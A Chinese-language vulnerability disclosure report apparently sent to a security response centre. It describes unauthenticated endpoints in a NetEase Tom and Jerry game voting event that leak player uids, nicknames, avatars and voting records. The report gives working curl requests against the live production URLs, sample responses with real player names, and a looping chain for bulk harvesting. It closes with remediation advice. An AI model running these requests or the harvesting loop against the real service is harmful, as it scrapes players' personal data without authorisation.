# SRC 漏洞提交报告 — 猫和老鼠 H5 投票系统未授权访问

> 提交人: 安全研究员 | 日期: 2026-08-16
> 目标: 网易 猫和老鼠 手游 H5 活动系统

---

## 漏洞一（主）：H5 投票系统未授权查询任意玩家角色信息（IDOR/越权）

**等级**: 中危（PII 批量泄露）

### 位置
```
https://s3.game.163.com/6ad12e1d981947da/user/checkRole
```
（猫和老鼠"2026猫鼠奖—逆风起航"投票活动 API 网关）

### 复现步骤
```bash
# 1. 任意正常玩家 uid（可通过下面漏洞二获得，或 uid=1 验证）
curl -k "https://s3.game.163.com/6ad12e1d981947da/user/checkRole?roleId=1&uid=1"
```

### 响应（匿名，无任何身份凭证）
```json
{"status":true,"success":true,"code":200,"msg":"成功",
 "data":{"roleId":1,"roleName":"国服第一斯派克","roleHeadUrl":"401","wxAuthId":null}}
```

其他验证 uid：
```
roleId=100000001 → "夜星北尘" (head=37)
roleId=161815195 → "Ae草莓" (head=7)
roleId=161815198 → "大力秋伦娜" (head=18)
```

### 漏洞原理
- GET 接口**无鉴权/无签名/无频率限制**
- `roleId` 参数直接映射玩家 uid，未做归属/登录态校验
- 可遍历 uid 批量获取玩家昵称+头像（PII）

### 影响
- 任意玩家昵称/头像批量采集（uid 范围 ~16 亿）
- 配合投票日志可做精准玩家画像
- 100 连发无限流（实测无 429）

---

## 漏洞二（副）：投票日志未授权读取（PII 泄露）

**等级**: 低-中危

### 位置
```
https://s3.game.163.com/6ad12e1d981947da/user/voteLog
```

### 复现
```bash
curl -k "https://s3.game.163.com/6ad12e1d981947da/user/voteLog"
```

### 响应（匿名）
```json
{"status":true,"code":200,"data":[
  {"id":283661,"createTime":[2025,11,30,23,59,29],"uid":"161815197",
   "roleName":"月色映雪伴日落","index":2,"count":7},
  ...共 20 条, 支持 ?roleId=N 按投票角色过滤...
]}
```

### 影响
- 投票用户 uid + 昵称 + 投票行为 + 时间戳（PII）
- 与漏洞一组合 = **uid 源 + 玩家信息查询攻击链**

---

## 攻击链（组合利用）
```
1. GET /user/voteLog?roleId=N   → 采集真实投票用户 uid（每请求 20 条）
2. GET /user/checkRole?roleId={uid}&uid={uid} → 查询玩家昵称/头像
3. 循环 → 批量玩家 PII 数据（无鉴权、无限流）
```

## 已测试边界（未越线项）
- 投票接口 vote: 需登录态（鉴权正常）
- 登录接口 shareKeyLogin/wxminLogin/gameCodeLogin: 校验正常
- 注入（SQLi/报错/盲注）: 参数化防护有效
- 未做批量大规模采集（仅 100 次抽样验证）

## 修复建议
1. checkRole/voteLog 增加登录态校验或接口签名
2. checkRole 对 uid 做归属校验（防越权遍历）
3. 返回字段脱敏（uid 模糊化）
4. voteLog 增加频率限制